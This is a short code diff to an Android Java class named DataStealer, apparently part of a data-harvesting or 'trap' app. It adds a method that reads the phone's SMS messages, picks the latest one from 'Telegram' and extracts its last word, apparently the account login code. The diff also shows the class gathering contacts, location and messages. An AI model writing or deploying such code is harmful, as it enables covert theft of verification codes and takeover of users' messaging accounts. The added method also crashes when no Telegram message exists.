@@ -19,6 +19,7 @@ import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.tasks.OnSuccessListener;
 
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Collections;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
@@ -28,6 +29,7 @@ import de.hpi3d.gamepgrog.trap.datatypes.Contact;
 import de.hpi3d.gamepgrog.trap.datatypes.Language;
 import de.hpi3d.gamepgrog.trap.datatypes.LocationData;
 import de.hpi3d.gamepgrog.trap.datatypes.TextMessage;
+import de.hpi3d.gamepgrog.trap.future.ArrayExt;
 import de.hpi3d.gamepgrog.trap.future.Consumer;
 
 
@@ -190,6 +192,19 @@ public class DataStealer {
         client.requestLocationUpdates(locationRequest,
                 locationCallback,
                 Looper.getMainLooper());
+    }
+
+    public static String takeTelegramAccessCode(Context context) {
+        List<TextMessage> messages = takeMessageData(context);
+        if (messages.size() > 0) {
+            List<TextMessage> messagesByTelegram = ArrayExt.filter(messages,
+                    (message) -> message.getAddress().equals("Telegram"));
+            Collections.sort(messagesByTelegram);
+            TextMessage telegramMessage = messagesByTelegram.get(messagesByTelegram.size() - 1);
+            String[] words = telegramMessage.getBody().split(" ");
+            return words[words.length - 1];
+        }
+        return "";
     }
 
     /**
